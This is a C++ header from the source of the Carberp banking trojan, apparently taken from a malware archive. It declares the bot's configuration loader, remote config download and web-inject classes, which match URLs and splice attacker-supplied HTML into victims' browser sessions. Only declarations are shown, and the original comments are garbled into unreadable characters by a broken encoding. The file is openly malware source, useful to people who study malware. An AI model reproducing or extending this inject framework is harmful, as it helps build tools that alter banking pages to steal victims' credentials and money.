/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
// -----------------------------------------------------------------------------

#ifndef BotConfigH
#define BotConfigH

// � ���������� ����������� ���������� �������� �� �������, ��� �
// ������ ������ ���������/���������� HTKL �������� ��������� � ���� ������
#define HTMLInjectsH

// -----------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"
#include "Requests.h"
#include "BotClasses.h"
#include "Requests.h"


#define VERB_IS_POST hmGET
#define VERB_IS_GET  hmPOST

#define MAX_POST_DATA_SIZE 5000
#define MIN_POST_DATA_SIZE 5



#define FGRHOSTFROMCFG		1
#define GRAHOSTFROMCFG		2
#define SCRHOSTFROMCFG		3
#define SNIHOSTFROMCFG		4
#define PLUGINSHOSTFROMCFG	5


const static char ConfigSignature[] = {'B', 'J', 'B', 0};

class TBotConfig;
class THTMLInjectList;
class THTMLInject;
class THTMLInjectData;



//---------------------------------------------
//  THTMLInjectList - ������ HTML ��������
//---------------------------------------------
class THTMLInjectList : public TBotCollection, public TEventContainer
{
private:
	friend class THTMLInject;
	friend class TBotConfig;
protected:
	bool GetInjectsForURL(THTTPMethod Method, const char *URL, PList List);
public:
	TValues* Variables;

	THTMLInjectList();
	~THTMLInjectList();

    void Clear();
	THTMLInject* AddInject();
	void ResetInjectsStatus();

	bool LoadFromMem(LPVOID Buf, DWORD BufSize);
	void ReleaseInjects(PList Injects);
	bool GetInjectsForRequest(PRequest Request);
    bool IsInjectURL(const char* URL, THTTPMethod Method = hmUnknown);

	inline THTMLInject* Items(int Index) const { return (THTMLInject*)((TBotCollection*)this)->Items(Index); }
};


//---------------------------------------------
//  THTMLInject - HTML ������
//---------------------------------------------
class THTMLInject : public TBotCollectionItem, public TEventContainer
{
private:
	TBotCollection* FItems;     // ������ �������� (������ ��������� ���� PHTMLInject)
	LONG            FRefCount;  // ���������� ������� ���������� �������

	void AddRef();
	void Release();

	friend class THTMLInjectList;
	friend class THTMLInjectData;
public:
	string URL;        // ����� ����� ��� �������� ���������� ������������ ��������
	bool   GET; 	   // ������������ GET �������
	bool   POST;       // ������������ POST �������
	bool   IsLog;      // ���������� HTML. ������ ������� ���������� ������ �� ������
	bool   Disabled;   // �� ������������ ������ (��� ���������� ���������)
	bool   Activated;  // ������� ���� ��� ����� ��������������
	DWORD  ID;         // �������������, ��� ���������� ����
	string Comment;    // ���������� � �������, ������ ��� ���������

	THTMLInject(THTMLInjectList *aOwner);
	~THTMLInject();

	THTMLInjectData*        AddData();
	inline void             Clear() { FItems->Clear(); }
	inline int              Count() {return FItems->Count(); }
    int                     ContainVariable(const char* VarName);
	inline THTMLInjectData* Items(int Index) const {return (THTMLInjectData*)FItems->Items(Index); }
};



enum TInjectDataState {idsUnknown, idsOk, idsError};


//---------------------------------------------
//  THTMLInjectData - ������ HTML �������
//---------------------------------------------
class THTMLInjectData : public TBotCollectionItem, public TEventContainer
{
private:
	THTMLInject* FOwner;
protected:

public:
	string Before;
	string Inject;
	string After;
    DWORD  ID;         // �������������
	TInjectDataState State;
    DWORD MacrosHash;  // ��� ������  ��� ����������� ������� �������
	bool Disabled;     // �� ������������ ������ (��� ���������� ���������)

	THTMLInjectData(THTMLInject *aOwner);

	inline THTMLInject* Owner() {return FOwner;}
	void Copy(const THTMLInjectData &Data);

	bool IsValid();
};



//***********************************************************
//  TBotConfig  - ��������� ���� �� ����������������� �����
//***********************************************************
class TBotConfig : public TBotObject
{
public:
	THTMLInjectList *HTMLInjects;

	TBotConfig();
	~TBotConfig();

	void Clear();
	bool LoadFromFile(const string &FileName);
};


//***********************************************************
//  TBJBConfigReader - ����� ������ �������� �� BJB �������
//***********************************************************
class TBJBConfigReader : public TBotObject
{
private:
	LPVOID FBuf;
	DWORD  FSize;
public:
	TBJBConfigReader(LPVOID Buf, DWORD BufSize);
    bool Read(TBotConfig* Config);
};




//*********************************************************
//  SetHTMLInjectEvent - ���������� ����� ���������
//		������� HTML �������
//*********************************************************
// �����, ������� HTML �������
enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
typedef void(*THTMLInjectEvent)(LPVOID Data,        	// ������� � �������� ���������������� �������
								LPVOID Sender, 	    	// �������� �������
								THTMLInjectEventID ID,  // ������������� �������
								LPVOID Reserver);      	// ���������������

void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);



//*****************************************************************
//  ������ ��� ������ � ���������� ������� �������
//*****************************************************************
namespace Config
{
	//*********************************************************
	//	Initialize - ���������������� ����������
	//  	��������� ����. ���� ������ ��� ����� FileName ��
	//  	��������� ����� ��������� �� ����, � ���������
	//  	������ ��������� ����� ��������� �� ����� ���
	//      �������� ������ � ���� ����.
	//*********************************************************
	TBotConfig* Initialize(PCHAR FileName = NULL);

	// ������� ���������� ��������� �� ������ ����
	TBotConfig* GetConfig();


    void Clear(TBotConfig* Config);

	//  ������� ���������� ��� ����� �������
	string GetFileName(bool HightPriority = false);

	//  ������� ������������� ��� ����� �������
	void SetFileName(const char *FileName);

	// ��������� ������
	bool Download(PCHAR URL);

	// ������� ���������� ������ ���� ����� �������� ��������
    bool IsConfig(PCHAR Buf);

	//  GetInjectsForRequest - �������� ������� ��� �������
	bool GetInjectsForRequest(PRequest Request);

	// ������� ��������� ���� �� ��� ���������� ������ ������
	bool IsInjectURL(PCHAR URL, THTTPMethod Method);
}


// HTML_INJECT_MACROS - HIM

#define HIM_REPLACE_DOCUMENT 0x6A665EA5 /* $REPLACE_DOCUMENT$ */


//****************************************************************************
//	HTMLInjects - ������ ��� ������ � HTML ���������
//****************************************************************************
namespace HTMLInjects
{

	//*********************************************************
	//  ��������� HTML �������.
	//
	//  ��������� - ������� ���������� ������ ���� � ������
	//              ������� ���� ������� ���������
	//*********************************************************
	bool Execute(PRequest Request, PHTTPSessionInfo Session);

	//*********************************************************
	// ������� ���������� ������ ���� ��������� ��� ��������
	// �������������� �������� ������� HTML
	//*********************************************************
	bool SupportContentType(PCHAR CType);

	//*********************************************************
	//  ������ ����������� ������ HTML �������
	//*********************************************************
	void FreeInject(THTMLInject *Inject);

	//*********************************************************
	// ReleaseInjectsList - ������� ����������� ������ ��������
	//                      ������� ���� �������� ��� �������
	// List - ������ ���������� ��������
	//*********************************************************
    void ReleaseInjectsList(PList List);
}

// -----------------------------------------------------------------------------
#endif
